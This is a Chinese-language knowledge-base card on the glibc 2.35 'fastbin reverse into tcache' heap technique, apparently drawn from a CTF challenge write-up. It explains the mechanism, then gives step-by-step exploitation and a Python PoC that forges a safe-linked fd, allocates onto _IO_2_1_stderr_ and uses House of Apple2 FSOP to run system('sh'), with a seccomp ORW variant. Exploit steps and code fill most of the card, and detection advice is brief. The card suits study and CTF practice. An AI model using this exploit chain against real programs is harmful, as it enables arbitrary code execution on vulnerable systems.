---
id: binary-pwn-heap-glibc235-fastbin-reverse-into-tcache-last-fd-arbitrary-alloc
title: glibc 2.35 fastbin reverse into tcache：fastbin 必须恰好 7 块，改写最后一个 chunk 的 fd 实现任意地址分配
type: scenario
domain: binary
path: binary/pwn/heap
technique: fastbin-reverse-into-tcache-last-fd-arbitrary-alloc
aliases:
- fastbin reverse into tcache
- fastbin 倒灌 tcache
- fastbin stash into tcache
- 改最后一个 chunk 的 fd
- glibc 2.35 任意地址分配
- it's myheap pro
tags:
- pwn
- heap
- glibc-2.35
- tcache
- fastbin
- safe-linking
- arbitrary-alloc
- fsop
- house-of-apple2
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.35（原文标记 libc2.35）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V274
  verified_at: '2026-11-08T00:30:00+08:00'
  notes: 已对照原文 it's myheap pro/plus 核对：14块0x60先填满tcache再入fastbin7块、抽空tcache、mark-UAF令链尾T(heapbase+0x830)再free、add(1)写target^(T>>12)、add(2)触发倒灌使target入tcache、再分配到_IO_2_1_stderr-0x10写fake FILE；0x50第二轮打stderr+0x90的_wide_data/_IO_wfile_jumps，wide_vtable+0x68写system；plus变体seccomp用magic_gadget/leave_ret+ORW。均与exp及img06-11一致；dedup append_scenario对比的2.41 fastbin-dup变体触发条件不同，成立。未复跑。
---

## 一句话结论

在 glibc 2.35 中，先把同尺寸 tcache 填满 7 个、再向 fastbin 释放 7 个块，然后把 tcache 抽空；此时若通过 UAF/任意 free 让 fastbin 链尾（最早释放）的 chunk 再被释放一次并改写它的 fd 为 `target ^ (chunk>>12)`，下一次同尺寸 malloc 会从 fastbin 取出链头、把剩余链逐块倒灌进 tcache，链尾 chunk 的伪造 fd 会被当作一个“fastbin chunk”一起 `tcache_put`，从而把 target 插入 tcache；随后继续分配即可拿到 target 地址。原文强调 fastbin 必须正好 7 个、且必须改最后一个 chunk 的 fd，否则在 2.35 的倒灌过程中容易段错误。

## 原理

- **倒灌机制**：glibc `_int_malloc` 的 fastbin 路径在取出 victim 后，如果对应 tcache bin 还有空位（`tcache->counts[idx] < 7`），会继续沿着 `REVEAL_PTR(chunk->fd)` 遍历 fastbin 链，把剩余 chunk 逐个 `tcache_put` 进 tcache，因此链表的顺序被反转。攻击者若控制链尾 chunk 的 fd，倒灌循环会把解码后的 target 当成下一个 fastbin chunk 处理，并对其执行 `tcache_put`，最终 target 成为 tcache 链的一部分。
- **为什么必须是 7 个 fastbin chunk**：tcache 容量为 7。先填满 tcache、再释放 7 个块，fastbin 恰好有 7 个；抽空 tcache 后，倒灌循环能完整处理这 7 个块并把 target 作为第 8 个“伪块”插入。原文实测在 2.35 下如果 fastbin 不足 7 个，倒灌时容易出现段错误（2.31 的检查更宽松）；规范化打法就是“fastbin 7 个 + 改最后一个 chunk 的 fd”。
- **safe-linking 编码**：fastbin/tcache 的 fd 都是 `PROTECT_PTR(&fd, next) = (chunk_user >> 12) ^ next`。要写 target，需写成 `target ^ (chunk_user >> 12)`。原文的链尾 chunk 位于 `heapbase+0x830`，其用户地址在同一个 4KB 页内，所以 `(heapbase+0x830)>>12` 与用户地址的页号相同，可直接作为编码密钥。
- **为什么需要“再释放一次链尾 chunk”**：链尾 chunk 已经在 fastbin 中，只有把它再次 free 到 fastbin 头，才能在下一次 `add` 中重新分配它并写入 fd；同时它仍留在原 fastbin 链的尾部，形成 `T -> ... -> T -> target` 的重叠视图——程序写入的是仍挂在链上的 T 的 fd，倒灌时就会沿着 target 继续走。原文借助 mark/指针分离原语（delete 只清 mark、可伪造 meta 的 pointer）对链尾 data chunk 执行这次额外的 free。
- **为什么最终能拿到任意分配**：倒灌结束后 target 已进入 tcache；tcache_get 只检查 16 字节对齐，不验证目标是否为真实 chunk，因此下一次 malloc 返回 target。target 需要 16 字节对齐，且其内部“next”位置的值要能解码为安全的链尾（通常为 0 或可控值），否则后续分配会崩溃。

## 触发条件

- x86-64 Linux，glibc 2.35；tcache 与 fastbin 均开启，safe-linking 生效。
- 能对同一 size 分配 14 个块并全部释放（先填满 tcache 的 7 个，再让 7 个进入 fastbin），且能知道链尾 chunk 的堆地址（heap 泄露）。
- 存在 UAF/任意 free 或 overlapping write，能把已在 fastbin 的链尾 chunk 再释放一次并改写其 fd；原文使用 mark/指针分离原语。
- 目标地址 16 字节对齐；已知 libc 基址以计算 `_IO_2_1_stderr_`/`_IO_list_all`/`system` 等偏移。
- 触发倒灌的 malloc 请求与 fastbin 同 size class；tcache 在该次请求前已被抽空。

## 利用步骤

1. 泄露 heap 与 libc（原文用 mark-UAF 任意读：先读 `chunk_list` 得 heap，再读 `stdout` 得 libc；也可用常规 unsorted bin 泄露）。
2. `for i in range(14): add(i, 0x60, 'a')`，然后全部 `delete`：前 7 个进入 tcache，后 7 个进入 fastbin；fastbin 链头是最后释放的块，链尾是这 7 个中最早释放的块 `T`。
3. `for i in range(7): add(i, 0x60, 'a')` 抽空 tcache；fastbin 仍有 7 个，`T` 位于链尾。
4. 用 mark-UAF 伪造一个残留索引的 meta（`mark=1, ptr=T`），`delete` 它，使 `free(T)` 再次发生，`T` 进入 fastbin 头；此时链为 `T -> ... -> T`（环）。
5. `add(1, 0x60, p64(target ^ (T_user>>12)))`：分配返回 `T`，程序把 safe-linking 编码的 target 写进 `T` 的用户区（fd）。此时 `T` 仍在 fastbin 链尾，链变为 `T -> ... -> T -> target`。
6. `add(2, 0x60, 'a')`：从 fastbin 取走链头，并触发对其余链的倒灌；`T` 与 target 被 `tcache_put` 进 tcache，target 位于 tcache 头。
7. `add(0, 0x60, payload)`：分配返回 target，写入 fake FILE / `_wide_data` / vtable 等数据。
8. 若目标为 `_IO_2_1_stderr_`，按 House of Apple2 布局写入 `_flags="  sh;"`、`_mode=0`、`_IO_write_base=0`、`_IO_write_ptr=1`、主 vtable=`_IO_wfile_jumps`，并第二次用同法分配到 `_stderr+0x90` 写 `_wide_data` 与 vtable 字段，最后在 `wide_vtable+0x68` 写 `system`；退出触发 `_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf → system`。
9. 有 seccomp 时把 `_wide_vtable+0x68` 换成栈枢转/magic gadget，并在堆上布置 ORW ROP，经 FSOP 的调用栈转去执行 `open/read/write`。

## PoC

原文 pro 题的两轮 fastbin reverse into tcache（0x60 打 `_IO_2_1_stderr_-0x10` 的 fake FILE，0x50 打 `stderr+0x90` 的 `_wide_data`/vtable 字段）：

```python
# 第一轮：填满 tcache 后放 7 个进 fastbin，抽空 tcache
for i in range(14):
    add(i, 0x60, 'a')
for i in range(14):
    delete(i)
for i in range(7):
    add(i, 0x60, 'a')

# mark-UAF: 伪造残留索引，令链尾 chunk T 再 free 一次
add(0, 0x18, p64(0x18) + p64(1) + p64(heapbase + 0x830))
delete(7)

# 改写 T 的 fd（safe-linking），触发倒灌，再分配到 stderr-0x10
add(1, 0x60, p64((IO_2_1_stderr - 0x10) ^ ((heapbase + 0x830) >> 12)))
add(2, 0x60, b'a')

payload = b'  sh;\x00\x00\x00' + p64(0)
payload += p64(0) + p64(system_addr) + p64(1) + p64(2)
payload = payload.ljust(0x48, b'\x00') + p64(heapbase)
add(0, 0x60, payload)                       # 申请出 _IO_2_1_stderr-0x10

# 清理后第二轮：0x50 尺寸，目标 stderr+0xa0-0x10 = stderr+0x90
for i in range(14):
    add(i, 0x50, 'a')
for i in range(14):
    delete(i)
for i in range(7):
    add(i, 0x50, 'a')
add(0, 0x18, p64(0x18) + p64(1) + p64(heapbase + 0xfc0))
delete(7)
add(1, 0x50, p64((IO_2_1_stderr + 0xa0 - 0x10) ^ ((heapbase + 0xfc0) >> 12)))
add(2, 0x50, b'a')
payload = p64(heapbase + 0x1310 + 0x10)      # _wide_data
payload = payload.ljust(0x38, b'\x00') + p64(libcbase + libc.sym['_IO_wfile_jumps'])
add(0, 0x50, payload)

# fake wide_data：+0x68 = system
wide_data = b'\x00'.ljust(0x68, b'\x00') + p64(system_addr)
add(0, 0x80, wide_data)
payload = b'\x00'.ljust(0x50, b'\x00') + p64(heapbase + 0x1310 + 0x10)
add(0, 0x80, payload)

p.sendlineafter(">>> ", str(4))              # exit -> FSOP
```

> 说明：原文 plus 变体在 PIE + seccomp 下用同一原语，但把 `wide_vtable+0x68` 换成 `magic_gadget`/`leave; ret` 做栈枢转，并布置 `open/read/write` ROP；堆偏移（0x830/0xfc0/0x1310）为原题布局。原文未附回显，未在本机复跑。

## 变体与关联

- **fastbin dup 变体**：[[binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc]]（glibc 2.41）用 `A→B→A` fastbin dup 让同一 chunk 同时被分配和倒灌；本卡不依赖 fastbin dup 的 A→B→A，而是“7 个正常 fastbin 块 + 对链尾再 free 一次”的规范化打法，触发条件与 PoC 不同。
- **目标变体**：target 可以是 `_IO_2_1_stderr_`（本卡 system）、`_IO_list_all`（再用 apple2 改链表）、`__free_hook`（2.34 前）、GOT（Partial RELRO）或 tcache_perthread_struct。
- **沙盒变体**：有 seccomp 时不能直接 system，可在 fake vtable 槽放栈枢转 gadget，把执行流引到堆上 ROP 做 ORW；参考 [[binary-pwn-heap-house-of-apple-2-stderr-fsop]] 的 FSOP 结构和 [[binary-pwn-rop-magic-gadget-csu-bss-write-orw-no-libc-leak]] 的 ORW 思路。
- **前置原语**：[[binary-pwn-heap-mark-pointer-split-metadata-uaf-arbitrary-read-free]]（任意读与任意 free，用于泄露 heap/libc 和触发链尾再次 free）。
- 边界：fastbin 少于 7 个、target 未 16 字节对齐、target 内的 next 解码不安全、tcache 未抽空、或 glibc 后续版本增加 fastbin/tcache 校验时本链失效。

## 检测与防御

- 修复：free 后置空指针；禁止对已释放 chunk 再次 free/edit；校验 delete 指针来源。
- 加固：升级 glibc 跟进 fastbin/tcache 的 safe-linking 与完整性检查；对 malloc 返回非堆地址（栈/libc/BSS）做检测；启用 MALLOC_CHECK_。
- 检测：同一 fastbin chunk 短时间内被多次 free；fastbin/tcache 链出现环或非堆地址；`malloc_consolidate`/`_int_malloc` 阶段崩溃；`_IO_2_1_stderr_` 被改写、`_wide_vtable` 指向堆。
- 该场景为 CTF/授权测试利用；生产环境应把“fastbin 链长度/重复 chunk”作为堆完整性告警项。
